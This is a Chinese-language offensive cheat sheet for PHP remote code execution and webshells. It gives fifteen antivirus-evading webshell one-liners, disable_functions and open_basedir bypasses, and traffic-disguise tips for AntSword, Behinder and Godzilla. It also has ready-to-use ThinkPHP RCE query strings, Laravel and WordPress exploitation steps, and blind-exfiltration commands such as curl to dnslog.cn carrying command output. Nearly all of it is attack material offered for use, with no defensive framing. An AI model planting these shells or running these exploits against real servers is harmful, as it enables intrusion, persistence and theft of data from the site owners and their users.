# PHP RCE 和 Webshell 实战手册

## 1. 命令注入函数速查
| 函数 | 输出 | 返回 | 适用 |
|------|------|------|------|
| system() | 直接输出 | 最后一行 | 需要回显 |
| exec() | 不输出 | 最后一行+数组 | 需传第二个参数 |
| shell_exec() | 不输出 | 完整字符串 | = 反引号 |
| passthru() | 直接输出 | NULL | 二进制流 |
| popen() | 管道 | 指针 | 无回显外带 |
| proc_open() | 全控制 | 进程句柄 | 最强,可读写 |
| pcntl_exec() | - | 不返回 | 替换进程 |

## 2. 无字母数字RCE
```php
// 异或构造 - 两个可打印字符异或得到字母
$_ = '@' ^ '!'; // yields 'a' (simplified, real XOR differs)
// 工具: https://github.com/php/php-src 字符表

// 取反构造 (~)
$_ = ~'\x8c\x86\x8c\x8b\x9a\x92'; // system
// 实用: echo urlencode(~'system');

// 自增 - PHP特性 'a'++ => 'b'
$a = 'a'; for($i=0;$i<25;$i++) $a++;
```

## 3. disable_functions 绕过 (8种)
```
1. LD_PRELOAD: gcc ant.c -shared -o evil.so -> putenv+mail触发
2. PHP-FPM: FastCGI Unix Socket直接执行 (/var/run/php-fpm.sock)
3. FFI: FFI::cdef('int system(const char*);','libc.so.6')
4. IMAP: imap_open('{x:993}INBOX','','') 注入恶意mailbox
5. Apache: apache2handler 子进程劫持
6. ImageMagick: delegate注入 (上传delegates.xml)
7. UAF: GC + SplHeap + __destruct 链
8. COM: new COM('WScript.Shell')->exec('cmd')  (Windows)
```

## 4. Webshell 绕过杀软 (20+变体)

### 基础变形
```php
// 1. eval经典
<?php eval($_POST['x']); ?>

// 2. assert (PHP < 7.2)
<?php assert($_POST['x']); ?>

// 3. 动态函数拼接
<?php $a='sy';$b='stem';$a.$b($_POST['x']); ?>

// 4. 变量函数
<?php $_=$_REQUEST['a']; $__=$_REQUEST['b']; $_($__); ?>
// ?a=system&b=cat /etc/passwd

// 5. create_function
<?php $f=create_function('',$_REQUEST['x']);$f(); ?>

// 6. array_map回调
<?php array_map($_GET['a'],[$_GET['b']]); ?>
// ?a=system&b=id

// 7. array_filter + 回调
<?php array_filter([$_POST['x']],$_POST['a']); ?>

// 8. preg_replace /e (PHP < 5.5)
<?php preg_replace('/.*/e',$_POST['x'],''); ?>

// 9. 反射执行
<?php $r=new ReflectionFunction('system');$r->invoke($_POST['x']); ?>

// 10. 位运算拼接
<?php $_=[];$_=@$_.'';$__=$_['!'=='@']; /* ... */ ?>

// 11. 反引号 (inline shell exec)
<?php echo `$_POST[x]`; ?>

// 12. include伪协议
<?php include 'data://text/plain;base64,'.base64_encode('<?php system($_POST[x]);?>'); ?>

// 13. 二次编码/hex
<?php eval(hex2bin($_POST['x'])); ?>

// 14. shutdown function
<?php register_shutdown_function($_POST['a'],$_POST['b']); ?>

// 15. ob_start callback
<?php ob_start($_POST['a']);echo $_POST['b'];ob_end_flush(); ?>
```

### 冰蝎/哥斯拉/蚁剑流量特征及绕过
```
蚁剑: base64 POST body, @ini_set('display_errors',0), 特征UA
冰蝎: AES-128加密, Accept: application/json, Content-Length固定
哥斯拉: XOR+Base64, 密钥协商握手, payload高度自定义

绕过方法:
- 修改UA为正常浏览器UA
- 加密key随机化
- 过CDN: Content-Type设为常见类型
- 二次编码: base64+urlencode
- 流量伪装: 伪装成正常API的JSON返回
```

## 5. 免杀高级技巧
```
1. 字符串全拆分: chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)
2. hex/oct/bin编码
3. 混淆注释: /*comment*/穿插关键字符串
4. .htaccess: AddType application/x-httpd-php .jpg + 图片马
5. .user.ini: auto_prepend_file=shell.jpg
6. 日志包含: /var/log/nginx/access.log写PHP代码 -> include
7. session包含: /tmp/sess_xxx存PHP -> include
8. /proc/self/fd/竞争: 临时文件包含
9. PHP内存马: PHP-FPM FastCGI socket注入
10. Phar反序列化: 上传.phar -> file_exists触发
```

## 6. 框架RCE
### ThinkPHP
```
5.0.x: ?s=index/think/app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
5.1.x: ?s=index/think/Request/input&filter=system&data=id
5.2.x: 同上变种
6.0.x: 多语言lang文件包含->RCE
```

### Laravel
```
CVE-2021-3129: Ignition debug -> log+phar RCE
.env泄露 -> APP_KEY -> 反序列化cookie -> RCE
phpggc Laravel/RCE1 'id'
```

### WordPress
```
插件漏洞为主 (WPBakery/Elementor等)
xmlrpc.php: system.multicall爆破/SSRF
主题编辑: /wp-admin/theme-editor.php -> 404.php写入
```

## 7. PHP绕过技巧
```
open_basedir绕过:
- chdir('..') 逐级逃离
- symlink('/','bypass') 链接逃离
- glob:// 伪协议
- PDO sqlite: 写文件到其它路径

无回显外带:
- curl/wget http://dnslog.cn/$(cmd)
- exec + fsockopen发送
- gethostbyname动态DNS
- error_log注入

读取文件:
- php://filter/read=convert.base64-encode/resource=
- compress.zlib://file
- file_get_contents + php://input
